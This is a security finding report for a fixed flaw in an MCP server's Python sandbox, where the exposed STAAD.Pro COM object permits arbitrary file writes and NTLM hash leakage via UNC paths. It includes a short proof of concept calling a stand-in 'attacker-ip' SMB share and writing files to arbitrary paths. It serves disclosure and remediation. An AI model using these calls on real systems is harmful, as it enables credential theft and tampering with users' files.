# OMCP-005: Arbitrary Filesystem Write and NTLM Credential Relay via STAAD COM API

## Overview
| Field | Value |
|-------|-------|
| ID | OMCP-005 |
| Title | Arbitrary Filesystem Write and NTLM Credential Relay via STAAD COM API |
| Severity | High |
| CVSS Score | 8.4 |
| Auth Required | No |
| Local/Remote | Remote |
| Status | Fixed in v2.0.0 |
| Category | Product Code Finding |

## SVS Mapping
- **TASVS**: N/A
- **ASVS**: ASVS-5.2.4 - Dynamic code execution features are disabled or sandboxed
- **ASVS**: ASVS-12.3.1 - File paths are validated to prevent path traversal attacks

## CWE Reference
- **CWE-73**: External Control of File Name or Path
- **CWE-522**: Insufficiently Protected Credentials (NTLM relay)

## Vulnerability Details

### Description

The sandbox blocks Python filesystem operations (`open`, `os`, `import`) but the `staad` COM object provides access to STAAD.Pro's own API methods that perform **filesystem operations at the Windows process level**, completely bypassing the Python sandbox. The sandbox only restricts the Python execution environment; it cannot intercept or restrict COM method calls that the staad object passes through to the external STAAD.Pro process.

STAAD.Pro's COM API includes methods for:
- **Creating new files**: `staad.NewSTAADFile(path, ...)` -- writes a new model file to any filesystem path
- **Opening files with UNC paths**: `staad.OpenSTAADFile("\\\\attacker\\share\\model.std")` -- triggers NTLM authentication to a remote SMB server
- **Exporting screenshots/reports**: `view.ExportView(directory, filename, ...)` -- writes image files to arbitrary directories
- **SaveAs operations**: Saving the current model to a new path

These methods accept attacker-controlled path strings and execute them in the context of the STAAD.Pro process (which runs with the user's full privileges).

### Affected Code

**File:** [/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py:112](/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py#L112)
```python
sandbox_globals["staad"] = staad_object  # Raw COM object with full API access
```

The sandbox validation (AST checker, builtins restriction) blocks Python-level I/O but has no mechanism to restrict which COM methods can be called on the `staad` object or what path arguments they receive.

**Evidence from bundled skill documentation:**

[/sources/openstaad-mcp/src/openstaad_mcp/staad_skills/staad-core/SKILL.md](/sources/openstaad-mcp/src/openstaad_mcp/staad_skills/staad-core/SKILL.md) documents `NewSTAADFile(path, ...)`, `OpenSTAADFile(path)`.

[/sources/openstaad-mcp/src/openstaad_mcp/staad_skills/staad-view/SKILL.md](/sources/openstaad-mcp/src/openstaad_mcp/staad_skills/staad-view/SKILL.md) documents `ExportView(FileLocation, FileName, ...)`.

### Root Cause Analysis
- **Vulnerable code explanation**: The sandbox design assumes that blocking Python's `open()`, `os`, and `import` is sufficient to prevent filesystem access. However, the COM bridge provides an out-of-band path to the filesystem through the STAAD.Pro process, which the Python sandbox cannot intercept.
- **Attack prerequisites**: Ability to invoke `execute_code` MCP tool. A STAAD.Pro instance must be connected.
- **Impact assessment**: 
  - **File write**: Attacker can write `.std` model files to any location writable by the user running STAAD.Pro. This could overwrite critical files.
  - **NTLM credential relay**: On Windows, opening a UNC path causes the STAAD.Pro process to authenticate to the SMB server, sending the user's NetNTLMv2 hash. This can be relayed for lateral movement or cracked offline.
  - **Model corruption**: Sandbox code can modify the currently loaded structural engineering model, potentially causing incorrect analysis results.

## Proof of Concept

```python
# Arbitrary file write via new model creation
staad.NewSTAADFile("C:\\Users\\Public\\pwned.std", 1, 0)

# NTLM credential relay via UNC path
staad.OpenSTAADFile("\\\\attacker-ip\\share\\model.std")

# Export screenshot to arbitrary directory
view = staad.View
view.ExportView("C:\\Users\\Public", "exfil", 1, True)
```

**Note**: These PoCs require a running STAAD.Pro instance and cannot be verified via static analysis alone. The status was "Potential Likely" at time of discovery. All three vectors are now blocked by v2.0.0 controls (see Resolution below).

## Resolution (v2.0.0 — 2026-04-26)

All three fix recommendations from the original report have been implemented:

### 1. COM method allowlist proxy (Recommendation 1)
The v2 WASM sandbox replaces the raw COM object with a handle-table proxy. Two host functions (`com_get`, `com_invoke`) are the only way to reach COM. Root object access is gated by `ALLOWED_ROOT_METHODS` (26 methods). Sub-objects are gated by per-object allowlists (727 methods total, deny-by-default). `SetStandardProfileDBFolder` is globally denied.

### 2. Consent gate for destructive methods (Recommendation 1 + 2)
`DESTRUCTIVE_METHODS` in [`constants.py`](../src/openstaad_mcp/sandbox/constants.py) classifies filesystem-write and session-destructive methods:
- **Root**: `NewSTAADFile`, `OpenSTAADFile`, `CloseSTAADFile`, `SaveModel`, `Quit`
- **View**: `ExportView`
- **Table**: `SaveReport`, `SaveReportAll`, `SaveTable`

These methods are **blocked by default** inside `com_invoke`. The `execute_code` MCP tool exposes a `confirm_destructive_operations` parameter (default `false`). Callers must explicitly opt in. This implements Control 4 (Explicit Consent for State-Changing Actions) from the Bentley MCP security architecture.

### 3. UNC path validation (Recommendation 2)
`PATH_ARGUMENT_INDICES` maps path-accepting methods to their argument positions. `_is_unc_path()` checks for `\\` prefix. UNC paths are **always rejected**, even with `confirm_destructive_operations=true`. This eliminates the NTLM relay vector.

### 4. Test coverage
- `TestConsentGate`: 11 tests verifying destructive methods are blocked by default and allowed with the flag
- `TestUNCPathBlocking`: 4 tests verifying UNC paths are always rejected
- Adversarial test `test_cannot_open_unc_path` rewritten to validate both consent gate and UNC blocking
- Total: 197 tests pass, 6 skipped, 0 failed

## Fix Recommendations

1. **COM method allowlist proxy**: Wrap the `staad` object in a proxy that only permits a curated set of safe COM methods (getters, read-only queries). Block or restrict methods that accept file paths (`NewSTAADFile`, `OpenSTAADFile`, `SaveAs`, `ExportView`).

2. **Path argument validation**: For COM methods that accept paths, validate that paths:
   - Are not UNC paths (`\\\\...`)
   - Are within an allowed directory
   - Are not absolute paths to sensitive locations

3. **Least-privilege COM API**: Consider exposing read-only COM operations (getters like `GetNodeCoordinates`, `GetMemberIncidences`) directly as MCP tools rather than allowing arbitrary code execution with full COM access.

---

## Source Reports
- [/scratch/ai-sast-scan-framework/output/projects/openstaad-mcp/results/reports_1/OMCP-011-com-api-filesystem-write-ntlm-relay.md](/scratch/ai-sast-scan-framework/output/projects/openstaad-mcp/results/reports_1/OMCP-011-com-api-filesystem-write-ntlm-relay.md)
- First discovered: Apr-14-2026-0000
- Validated: Apr-14-2026

## Report Metadata
| Field | Value |
|-------|-------|
| Agent | GitHub Copilot |
| Model | Claude Opus 4.6 |
| Timestamp | Apr-14-2026-0000 |
